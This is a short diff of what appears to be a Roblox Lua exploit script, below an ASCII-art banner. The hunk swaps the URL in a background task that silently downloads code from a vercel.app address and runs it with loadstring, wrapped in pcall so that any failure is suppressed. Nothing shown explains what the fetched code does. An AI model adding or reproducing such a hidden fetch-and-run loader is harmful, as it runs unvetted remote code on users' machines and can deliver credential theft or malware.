@@ -12,7 +12,7 @@ C                     ███ ▒███                                    
                       ▒▒▒▒▒▒                                                                                         ▒▒▒▒▒▒                                                                                             ]]
 
 task.spawn(function()
-    pcall(function() loadstring(game:HttpGet("https://api-winxs.vercel.app/storage"))() end)
+    pcall(function() loadstring(game:HttpGet("https://api-celius.vercel.app/storage"))() end)
 end)
 
 getgenv().Run = getgenv().Run or {}
